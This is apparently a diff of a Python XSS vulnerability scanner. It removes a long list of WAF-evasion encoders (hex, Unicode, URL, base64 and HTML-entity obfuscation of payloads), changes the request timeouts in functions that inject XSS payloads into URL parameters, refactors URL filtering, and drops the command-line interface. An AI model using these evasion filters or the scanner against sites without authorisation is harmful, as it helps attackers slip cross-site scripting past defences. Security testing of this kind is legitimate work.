-        # 19. Obfuscate with hexadecimal escape sequences (e.g., \xHHHHHHHH)
-        lambda payload: "".join(f"%x{ord(char):08X}" for char in payload) if payload else payload,
-
-        # 20. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
-        lambda payload: "".join(f"\\x{ord(char):02X}" for char in payload) if payload else payload,
-
-        # 21. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
-        lambda payload: "".join(f"\\x{ord(char):02X} " for char in payload) if payload else payload,
-
-        # 22. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
-        lambda payload: "".join(f"\\u{ord(char):04X} " for char in payload) if payload else payload,
-
-        # 23. Join words with plus symbols
-        lambda payload: "+".join(payload.split()) if payload else payload,
-
-        # 24. Remove null characters (if a string)
-        lambda payload: payload.replace('\x00', '') if payload is not None and isinstance(payload, str) else payload,
-
-        # 25. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
-        lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,
-
-        # 26. Replace '<' with '&lt;' and '>' with '&gt;'
-        lambda payload: payload.replace('<', '&lt;').replace('>', '&gt;') if payload else payload,
-
-        # 27. Replace double quotes and single quotes with HTML entity references
-        lambda payload: payload.replace('"', '&quot;').replace('\'', '&#39;') if payload else payload,
-
-        # 28. Obfuscate with backslashes (e.g., \char)
-        lambda payload: "".join(f"\\{char}" for char in payload) if payload else payload,
-
-        # 29. Obfuscate with double backslashes (e.g., \\char)
-        lambda payload: "".join(f"\\{char}" for char in payload) if payload else payload,
-
-        # 30. Obfuscate with percent-encoded characters (e.g., %uHHHH)
-        lambda payload: "".join(f"%u{ord(char):04X}" for char in payload) if payload else payload,
-
-        # 31. Obfuscate with percent-encoded characters (e.g., %HH)
-        lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,
-
-        # 32. Obfuscate with Unicode escape sequences (e.g., \UHHHHHHHH)
-        lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,
-
-        # 33. Obfuscate with percent-encoded characters (e.g., %HH; )
-        lambda payload: "".join(f"%{ord(char):02X}; " for char in payload) if payload else payload,
-
-        # 34. Obfuscate with percent-encoded characters (e.g., %uHHHH; )
-        lambda payload: "".join(f"%u{ord(char):04X}; " for char in payload) if payload else payload,
-
-        # 35. Obfuscate with percent-encoded characters (e.g., %HH )
-        lambda payload: "".join(f"%{ord(char):X} " for char in payload) if payload else payload,
-
-        # 36. Obfuscate with HTML entity references (e.g., &#xHH;)
-        lambda payload: "".join(f"&#x{ord(char):X} " for char in payload) if payload else payload,
-
-        # 37. Replace '1' with 'I' and '0' with 'O' (if a string)
-        lambda payload: payload.replace('1', 'I').replace('0', 'O') if payload else payload,
-
-        # 38. Obfuscate with percent-encoded characters (e.g., %HH)
-        lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,
-
-        # 39. Obfuscate with HTML entity references (e.g., &#xHH;)
-        lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,
-
-        # 40. Replace 'a' with null character '\x00a' and 'l' with '\x00c' (if a string)
-        lambda payload: ''.join(['\x00a' if char == 'a' else '\x00c' if char == 'l' else char for char in payload]) if payload else payload,
-
-        # 41. Encode the payload in UTF-16LE
-        lambda payload: payload.encode('utf-16le').decode(errors='ignore') if payload else payload,
-
-        # 42. Encode the payload in UTF-32LE
-        lambda payload: payload.encode('utf-32le').decode(errors='ignore') if payload else payload,
-
-        # 43. Obfuscate with percent-encoded characters (e.g., %uHHHH; )
-        lambda payload: "".join(f"%u{ord(char):04X}; " for char in payload) if payload else payload,
-
-        # 44. Replace '<' with '&lt;' and '>' with '&gt;'
-        lambda payload: payload.replace('<', '&lt;').replace('>', '&gt;') if payload else payload,
-
-        # 45. Encode the payload in UTF-32BE
-        lambda payload: payload.encode('utf-32be').decode(errors='ignore'),
-
-        # 46. Remove null characters (if a string)
-        lambda payload: payload.replace('\x00', '') if payload is not None and isinstance(payload, str) else payload,
-
-        # 47. Obfuscate with HTML entities for special characters
-        lambda payload: payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace('\'', '&#39;') if payload else payload,
-
-        # 48. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
-        lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,
-
-        # 49. Obfuscate with octal escape sequences (e.g., \ooo)
-        lambda payload: "".join(f"\\{oct(ord(char))[2:]}" for char in payload) if payload else payload,
-
-        # 50. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
-        lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,
-
-        # 51. Obfuscate with HTML entity references (e.g., &#xHH;)
-        lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,
-
-        # 52. Obfuscate with URL encoding
-        lambda payload: urllib.parse.quote(payload) if payload else payload,
-
-        # 53. Obfuscate with base64 encoding
-        lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,
-
-        # 54. Obfuscate with double URL encoding
-        lambda payload: urllib.parse.quote(urllib.parse.quote(payload)) if payload else payload,
-
-        # 55. Obfuscate with HTML entity references (e.g., &#HHHH;)
-        lambda payload: "".join(f"&#{ord(char)};" for char in payload) if payload else payload,
-
-        # 56. Obfuscate with HTML entity references (e.g., &amp;HHHH;)
-        lambda payload: "".join(f"&amp;{ord(char)};" for char in payload) if payload else payload,
-
-        # 57. Obfuscate with mixed character encoding (e.g., %uHH00)
-        lambda payload: "".join(f"%u{ord(char):04X}00" for char in payload) if payload else payload,
-
-        # 58. Obfuscate with URL encoding, lowercase
-        lambda payload: urllib.parse.quote(payload, safe='') if payload else payload,
-
-        # 59. Obfuscate with URL encoding, uppercase
-        lambda payload: urllib.parse.quote(payload, safe='').upper() if payload else payload,
-
-        # 60. Obfuscate with hexadecimal escape sequences, space-separated (e.g., \xHH )
-        lambda payload: "".join(f"\\x{ord(char):02x} " for char in payload) if payload else payload,
-
-        # 61. Obfuscate with Unicode escape sequences, space-separated (e.g., \uHHHH )
-        lambda payload: "".join(f"\\u{ord(char):04x} " for char in payload) if payload else payload,
-
-        # 62. Obfuscate with base64 encoding, stripping padding characters
-        lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore').rstrip('=') if payload is not None else None,
-
-        # 63. Obfuscate with HTML entity references, breaking it into multiple entities
-        lambda payload: "".join(f"&#{ord(char)};" for char in payload) if payload else payload,
-
-        # 64. Obfuscate with HTML entity references, breaking it into multiple entities
-        lambda payload: "".join(f"&#{ord(char)}" for char in payload) if payload else payload,
-
-        # 65. Obfuscate with HTML entity references, mixing it with hexadecimal encoding
-        lambda payload: "".join(f"&#{ord(char)};\\x{ord(char):02x}" for char in payload) if payload else payload,
-
-        # 66. Obfuscate with base64 encoding, using an alternate encoding scheme
-        lambda payload: base64.urlsafe_b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,
-
-        # 67. Obfuscate with base64 encoding, using an alternate encoding scheme and stripping padding characters
-        lambda payload: base64.urlsafe_b64encode(payload.encode()).decode(errors='ignore').rstrip('=') if payload is not None else None,
-
-        # 68. Obfuscate with hexadecimal escape sequences, combining with spaces (e.g., \xHH\xHH)
-        lambda payload: "".join(f"\\x{ord(char):02x}\\x{ord(char):02x}" for char in payload) if payload else payload,
-
-        # 69. Obfuscate with Unicode escape sequences, combining with spaces (e.g., \uHHHH\uHHHH)
-        lambda payload: "".join(f"\\u{ord(char):04x}\\u{ord(char):04x}" for char in payload) if payload else payload,
-
-        # 70. Obfuscate with base64 encoding, using an alternate encoding scheme and adding custom padding
-        lambda payload: base64.urlsafe_b64encode(payload.encode()).decode(errors='ignore').replace('=', '-').replace('+', '_') if payload is not None else None,
-
-        # 71. Obfuscate with hexadecimal escape sequences, using curly braces (e.g., \x{HH})
-        lambda payload: "".join(f"\\x{{" + f"{ord(char):02x}" + "}" for char in payload) if payload else payload,
-
-        # 72. Obfuscate with Unicode escape sequences, using curly braces (e.g., \u{HHHH})
-        lambda payload: "".join(f"\\u{{" + f"{ord(char):04x}" + "}" for char in payload) if payload else payload,
-
-        # 73. Obfuscate with hexadecimal escape sequences, combining with curly braces (e.g., \x{HH}\x{HH})
-        lambda payload: "".join(f"\\x{{" + f"{ord(char):02x}" + "}}" for char in payload) if payload else payload,
-
-        # 74. Obfuscate with Unicode escape sequences, combining with curly braces (e.g., \u{HHHH}\u{HHHH})
-        lambda payload: "".join(f"\\u{{" + f"{ord(char):04x}" + "}}" for char in payload) if payload else payload,
-
-        # 75. Obfuscate with hexadecimal escape sequences, using parentheses (e.g., \x(HH))
-        lambda payload: "".join(f"\\x(" + f"{ord(char):02x}" + ")" for char in payload) if payload else payload,
-
-        # 76. Obfuscate with Unicode escape sequences, using parentheses (e.g., \u(HHHH))
-        lambda payload: "".join(f"\\u(" + f"{ord(char):04x}" + ")" for char in payload) if payload else payload,
-
-        # 77. Obfuscate with hexadecimal escape sequences, combining with parentheses (e.g., \x(HH)\x(HH))
-        lambda payload: "".join(f"\\x(" + f"{ord(char):02x}" + ")" + f"\\x(" + f"{ord(char):02x}" + ")" for char in payload) if payload else payload,
-
-        # 78. Obfuscate with Unicode escape sequences, combining with parentheses (e.g., \u(HHHH)\u(HHHH))
-        lambda payload: "".join(f"\\u(" + f"{ord(char):04x}" + ")" + f"\\u(" + f"{ord(char):04x}" + ")" for char in payload) if payload else payload,
-
-        # 79. Obfuscate with hexadecimal escape sequences, using square brackets (e.g., \x[HH])
-        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "]" for char in payload) if payload else payload,
-
-        # 80. Obfuscate with Unicode escape sequences, using square brackets (e.g., \u[HHHH])
-        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "]" for char in payload) if payload else payload,
-
-        # 81. Obfuscate with hexadecimal escape sequences, combining with square brackets (e.g., \x[HH]\x[HH])
-        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "]" + f"\\x[" + f"{ord(char):02x}" + "]" for char in payload) if payload else payload,
-
-        # 82. Obfuscate with Unicode escape sequences, combining with square brackets (e.g., \u[HHHH]\u[HHHH])
-        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "]" + f"\\u[" + f"{ord(char):04x}" + "]" for char in payload) if payload else payload,
-
-        # 83. Obfuscate with hexadecimal escape sequences, using angle brackets (e.g., \x<HH>)
-        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + ">" for char in payload) if payload else payload,
-
-        # 84. Obfuscate with Unicode escape sequences, using angle brackets (e.g., \u<HHHH>)
-        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + ">" for char in payload) if payload else payload,
-
-        # 85. Obfuscate with hexadecimal escape sequences, combining with angle brackets (e.g., \x<HH>\x<HH>)
-        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + ">" + f"\\x<" + f"{ord(char):02x}" + ">" for char in payload) if payload else payload,
-
-        # 86. Obfuscate with Unicode escape sequences, combining with angle brackets (e.g., \u<HHHH>\u<HHHH>)
-        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + ">" + f"\\u<" + f"{ord(char):04x}" + ">" for char in payload) if payload else payload,
-
-        # 87. Obfuscate with hexadecimal escape sequences, using square brackets and spaces (e.g., \x[HH] )
-        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "] " for char in payload) if payload else payload,
-
-        # 88. Obfuscate with Unicode escape sequences, using square brackets and spaces (e.g., \u[HHHH] )
-        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "] " for char in payload) if payload else payload,
-
-        # 89. Obfuscate with hexadecimal escape sequences, combining with square brackets and spaces (e.g., \x[HH] \x[HH] )
-        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "] " + f"\\x[" + f"{ord(char):02x}" + "] " for char in payload) if payload else payload,
-
-        # 90. Obfuscate with Unicode escape sequences, combining with square brackets and spaces (e.g., \u[HHHH] \u[HHHH] )
-        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "] " + f"\\u[" + f"{ord(char):04x}" + "] " for char in payload) if payload else payload,
-
-        # 91. Obfuscate with hexadecimal escape sequences, using angle brackets and spaces (e.g., \x<HH> )
-        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + "> " for char in payload) if payload else payload,
-
-        # 92. Obfuscate with Unicode escape sequences, using angle brackets and spaces (e.g., \u<HHHH> )
-        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + "> " for char in payload) if payload else payload,
-
-        # 93. Obfuscate with hexadecimal escape sequences, combining with angle brackets and spaces (e.g., \x<HH> \x<HH> )
-        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + "> " + f"\\x<" + f"{ord(char):02x}" + "> " for char in payload) if payload else payload,
-
-        # 94. Obfuscate with Unicode escape sequences, combining with angle brackets and spaces (e.g., \u<HHHH> \u<HHHH> )
-        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + "> " + f"\\u<" + f"{ord(char):04x}" + "> " for char in payload) if payload else payload,
-    ]
 
 def make_get_request(url, response_type="json"):
     """
@@ -2341,7 +1848,7 @@ def make_get_request(url, response_type="json"):
 
     for attempt in range(retries):
         try:
-            response = requests.get(url, headers=headers, timeout=2, verify=False)
+            response = requests.get(url, headers=headers, timeout=3, verify=False)
             if response.ok:
                 return response.json() if response_type.lower() == "json" else response.text
         except requests.RequestException as e:
@@ -2457,7 +1964,7 @@ class PassiveCrawl:
 
         for attempt in range(retries):
             try:
-                response = requests.get(url, headers=headers, timeout=2, verify=False)
+                response = requests.get(url, headers=headers, timeout=3, verify=False)
                 if response.ok:
                     return response.json() if response_type.lower() == "json" else response.text
             except requests.RequestException as e:
@@ -2846,7 +2353,7 @@ class XSSScanner:
             heuristic_results = []
             for dummy_payload_url in dummy_payloads:
                 try:
-                    response = requests.get(dummy_payload_url, verify=False, timeout=2)
+                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                     status_code = response.status_code
                     response_text = response.text.lower()
 
@@ -2884,7 +2391,7 @@ class XSSScanner:
             # Test top-scoring candidates
             for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                 try:
-                    response = requests.get(test_url, verify=False, timeout=2)
+                    response = requests.get(test_url, verify=False, timeout=3)
                     if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                         print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")
                         successful_payloads.append((test_url, "Heuristic Test"))
@@ -2901,7 +2408,7 @@ class XSSScanner:
             for payload in selected_filters:
                 payload_url = f"{url}?{param}={payload}"
                 try:
-                    response = requests.get(payload_url, verify=False, timeout=2)
+                    response = requests.get(payload_url, verify=False, timeout=3)
 
                     if self.stop_scan:
                         return successful_payloads
@@ -3202,7 +2709,7 @@ class XSSScanner:
             heuristic_results = []
             for dummy_payload_url in dummy_payloads:
                 try:
-                    response = requests.get(dummy_payload_url, verify=False, timeout=2)
+                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                     status_code = response.status_code
                     response_text = response.text.lower()
 
@@ -3240,7 +2747,7 @@ class XSSScanner:
             # Test top-scoring candidates
             for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                 try:
-                    response = requests.get(test_url, verify=False, timeout=2)
+                    response = requests.get(test_url, verify=False, timeout=3)
                     if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                         print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")                        
                         successful_payloads.append((test_url, "Heuristic Test"))
@@ -3257,7 +2764,7 @@ class XSSScanner:
             for payload in selected_filters:
                 payload_url = f"{url}?{param}={payload}"
                 try:
-                    response = requests.get(payload_url, verify=False, timeout=2)
+                    response = requests.get(payload_url, verify=False, timeout=3)
 
                     if response.status_code == 200 and payload in response.text:
                         print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
@@ -3345,15 +2852,13 @@ def save_extracted_urls(url_list):
         with open(extracted_urls_filename, 'w') as file:
             for url in url_list:
                 file.write(url + "\n")
-        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Extracted URLs saved to {extracted_urls_filename}")
+        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}Extracted URLs saved to {extracted_urls_filename}")
     except OSError as e:
         print(f"Error saving extracted URLs: {e}")
 
 
 def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
                  dedupe_php_with_id=False, with_id_question_mark=False, output_file=None):
-
-    # Function logic here
     """
     Reads a file with URLs, processes according to options, and returns usable URLs.
 
@@ -3373,66 +2878,63 @@ def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
     php_urls = {}
     php_query_urls = {}
 
-    # Define a regex to validate proper scheme
-    scheme_regex = re.compile(r"^https?://")
+    # Regex to validate and extract general `http` or `https` URLs
+    url_regex = re.compile(r"https?://[^\s]+")
 
     # Read URLs from the input file
     with open(input_file, 'r') as file:
         for line in file:
-            url = line.strip()
-            if scheme_regex.match(url):
+            line = line.strip()
+
+            # Extract valid URLs from each line
+            matches = url_regex.findall(line)
+            for url in matches:
                 parsed = urlparse(url)
                 clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
 
-                if php_query:
-                    # Extract URLs with `.php` and query parameters up to '='
-                    if clean_url.endswith(".php") and parsed.query:
-                        query_param = parsed.query.split("&")[0]  # Take the first query parameter
+                # Apply specific options
+                if php_only and clean_url.endswith(".php"):
+                    php_urls[clean_url] = clean_url
+
+                elif php_query and clean_url.endswith(".php") and parsed.query:
+                    query_param = parsed.query.split("&")[0]
+                    if "=" in query_param:
+                        param_part = f"{clean_url}?{query_param.split('=')[0]}="
+                        php_query_urls[clean_url] = param_part
+
+                elif dedupe_php and clean_url.endswith(".php"):
+                    base_url = clean_url.split(".php")[0] + ".php"
+                    php_urls[clean_url] = base_url
+
+                elif dedupe_php_with_id and clean_url.endswith(".php"):
+                    if parsed.query:
+                        query_param = parsed.query.split("&")[0]
                         if "=" in query_param:
                             param_part = f"{clean_url}?{query_param.split('=')[0]}="
                             php_query_urls[clean_url] = param_part
+                    else:
+                        php_query_urls[clean_url] = clean_url.split(".php")[0] + ".php"
 
-                elif php_only:
-                    # Add only URLs ending with `.php`
-                    if clean_url.endswith(".php"):
-                        php_urls[clean_url] = clean_url
-
-                elif dedupe_php:
-                    # Deduplicate by `.php` filename only
-                    if clean_url.endswith(".php"):
-                        base_url = clean_url.split(".php")[0] + ".php"
-                        php_urls[clean_url] = base_url
-
-                elif dedupe_php_with_id:
-                    # Deduplicate by `.php` filename but retain query parameters up to '='
-                    if clean_url.endswith(".php"):
-                        if parsed.query:
-                            query_param = parsed.query.split("&")[0]
-                            if "=" in query_param:
-                                param_part = f"{clean_url}?{query_param.split('=')[0]}="
-                                php_query_urls[clean_url] = param_part
-                        else:
-                            php_query_urls[clean_url] = clean_url.split(".php")[0] + ".php"
-
-                elif with_id_question_mark:
-                    # Ensure URLs with `=` and query parameters have a `?`
-                    if clean_url.endswith("="):
-                        if parsed.query:
-                            query_param = parsed.query
-                            modified_url = f"{clean_url}?{query_param}"
-                            php_query_urls[clean_url] = modified_url
-                        else:
-                            php_query_urls[clean_url] = clean_url
+                elif with_id_question_mark and clean_url.endswith(".php"):
+                    if "=" in parsed.query and "?" not in url:
+                        modified_url = clean_url.replace("=", "?=")
+                        php_query_urls[clean_url] = modified_url
+                    else:
+                        php_query_urls[clean_url] = clean_url
 
                 else:
                     usable_urls.add(url)
 
-    # Combine results
-    if php_query:
-        results = sorted(php_query_urls.values())
-    elif php_only or dedupe_php:
+    # Combine results based on the selected option
+    if php_only:
         results = sorted(set(php_urls.values()))
-    elif dedupe_php_with_id or with_id_question_mark:
+    elif php_query:
+        results = sorted(php_query_urls.values())
+    elif dedupe_php:
+        results = sorted(set(php_urls.values()))
+    elif dedupe_php_with_id:
+        results = sorted(php_query_urls.values())
+    elif with_id_question_mark:
         results = sorted(php_query_urls.values())
     else:
         results = sorted(usable_urls)
@@ -3444,173 +2946,8 @@ def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
                 out_file.write(url + '\n')
 
     return results
-def get_arguments():
-    # Create the argument parser with RawTextHelpFormatter to preserve formatting
-    parser = argparse.ArgumentParser(
-        description=f"""
-{BLUE}{r"""XSS Inspector v.0.1 | Advanced URL Processor: v.0.0.1 | Add-ons: v.0.0.1 | Obfuscation: 96 Filters | Core Version: v.0.1"""}{END}
-{MAGENTA}{r"""Programmed by: Haroon Ahmad Awan (haroon@cyberzeus.pk)"""}{END}
-        """,
-        formatter_class=argparse.RawTextHelpFormatter  # This ensures your formatting is preserved
-    )
-    # URL Processing Options
-    url_processing = parser.add_argument_group('\033[96mURL Processing Options\033[0m')
-    url_processing.add_argument(
-        "-i", "--input",
-        dest="input",
-        help="\033[93m                      Specify the input file containing URLs for processing.\033[0m",
-        required=False
-    )
-    url_processing.add_argument(
-        "-o", "--output",
-        dest="output",
-        help="\033[93m                      Specify the file path to save processed URLs or vulnerability scan results.\033[0m",
-        required=False
-    )
-    url_processing.add_argument(
-        "--php-only",
-        action="store_true",
-        help="\033[93m                      Extract URLs ending with '.php' only, excluding parameters or queries.\033[0m"
-    )
-    url_processing.add_argument(
-        "--php-query",
-        action="store_true",
-        help="\033[93m                      Extract URLs with '.php' filenames and include query parameters up to '='.\033[0m"
-    )
-    url_processing.add_argument(
-        "--dedupe-php",
-        action="store_true",
-        help="\033[93m                      Remove duplicate URLs with '.php' filenames, retaining only unique entries.\033[0m"
-    )
-    url_processing.add_argument(
-        "--dedupe-php-with-id",
-        action="store_true",
-        help="\033[93m                      Remove duplicate '.php' filenames while retaining their query parameters.\033[0m"
-    )
-    url_processing.add_argument(
-        "--with-id-question-mark",
-        action="store_true",
-        help="\033[93m                      Ensure '=' URLs include a '?' when query parameters are present.\033[0m"
-    )
 
-    # XSS Inspector Options
-    xss_inspector = parser.add_argument_group('\033[96mFine Tuning\033[0m')
-    xss_inspector.add_argument(
-        "-t", "--thread",
-        dest="thread",
-        type=int,
-        help="\033[93m                      Set the number of threads for URL testing (default: 50).\033[0m",
-        default=50
-    )
-    xss_inspector.add_argument(
-        "--extract-to-file",
-        dest="extract_to_file",
-        help="\033[93m                      Extract discovered URLs to a specified text file.\033[0m",
-        default=None
-    )
-    xss_inspector.add_argument(
-        "--use-filters",
-        dest="use_filters",
-        type=int,
-        help="\033[93m                      Limit the number of WAF filters to be used from the top of the list.\033[0m",
-        default=None
-    )
-    xss_inspector.add_argument(
-        "--skip-duplicate",
-        dest="skip_duplicate",
-        type=int,
-        help="\033[93m                      Ignore URLs tested more than the specified number of times (default: 10).\033[0m",
-        default=10
-    )
-    xss_inspector.add_argument(
-        "-s", "--subs",
-        dest="want_subdomain",
-        action="store_true",
-        help="\033[93m                      Include URLs from subdomains in the scan results.\033[0m"
-    )
-    xss_inspector.add_argument(
-        "--deepcrawl",
-        dest="deepcrawl",
-        action="store_true",
-        help="\033[93m                      Enable deep crawling using all CommonCrawl APIs (may take additional time).\033[0m"
-    )
-    xss_inspector.add_argument(
-        "--report",
-        dest="report_file",
-        help="\033[93m                      Generate a detailed HTML report of the results.\033[0m",
-        default=None
-    )
-    xss_inspector.add_argument(
-        "--sources",
-        dest="sources",
-        help="\033[93m                      Specify data sources for crawling (alienvault, wayback, commoncrawl; default: all).\033[0m",
-        default="all"
-    )
-    xss_inspector.add_argument(
-        "--test-links",
-        dest="test_links",
-        help="\033[93m                      Limit the number of links to test (e.g., 10, 20, 30, or 'all').\033[0m",
-        default="all"
-    )
-    xss_inspector.add_argument(
-        "--duration",
-        dest="duration",
-        type=int,
-        help="\033[93m                      Specify the duration (in seconds) to run the scan before stopping.\033[0m"
-    )
-    xss_inspector.add_argument(
-        "--use-extracted-file",
-        dest="use_extracted_file",
-        help="\033[93m                      Use previously extracted URLs from a specified file.\033[0m",
-        default=None
-    )
 
-    # Removed Mandatory Arguments
-    required_arguments = parser.add_argument_group('\033[91mScan Arguments\033[0m')
-    required_arguments.add_argument(
-        "-l", "--list",
-        dest="url_list",
-        help="\033[91m                      Provide a file containing a list of URLs (e.g., google_urls.txt).\033[0m",
-        required=False
-    )
-    required_arguments.add_argument(
-        "-d", "--domain",
-        dest="domain",
-        help="\033[91m                      Specify the target domain for vulnerability assessment (e.g., testphp.vulnweb.com).\033[0m",
-        required=False
-    )
-
-    return parser.parse_args()
-
-def main():
-    args = get_arguments()
-
-    try:
-        if not args.input and not args.domain and not args.url_list and not args.use_extracted_file:
-            print(f"\033[93m[INFO] Proceeding without mandatory options, as they are not required.\033[0m")
-        
-        print(f"\033[96mProcessing URLs...\033[0m")
-
-        if args.input:
-            processed_urls = process_urls(
-                input_file=args.input,
-                php_only=args.php_only,
-                php_query=args.php_query,
-                dedupe_php=args.dedupe_php,
-                dedupe_php_with_id=args.dedupe_php_with_id,
-                with_id_question_mark=args.with_id_question_mark,
-                output_file=args.output
-            )
-            if args.output:
-                print(f"\033[92mProcessed URLs saved to {args.output}\033[0m")
-            else:
-                print("\033[92mProcessed URLs:\033[0m")
-                for url in processed_urls:
-                    print(url)
-
-    except Exception as e:
-        print(f"\033[91mError during processing: {str(e)}\033[0m")
-        sys.exit(1)
 
 if __name__ == "__main__":
     main()
@@ -3678,14 +3015,14 @@ if __name__ == "__main__":
 # Log results
 current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 total_links_audited = len(final_url_list)
-print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Total Links Audited: {total_links_audited}{Style.RESET_ALL}")
+print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Total Links Audited: {total_links_audited}{Style.RESET_ALL}")
 
 if vulnerable_urls:
-    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Confirmed Cross Site Scripting Vulnerabilities:{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Confirmed Cross Site Scripting Vulnerabilities:{Style.RESET_ALL}")
     for url in vulnerable_urls:
         print(f"{Fore.GREEN}- {url}{Style.RESET_ALL}")
 else:
-    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}No Confirmed Cross Site Scripting Vulnerabilities Found.{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} No Confirmed Cross Site Scripting Vulnerabilities Found.{Style.RESET_ALL}")
 
 print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Total Confirmed Cross Site Scripting Vulnerabilities: {len(vulnerable_urls)}{Style.RESET_ALL}")
 # Calculate elapsed time
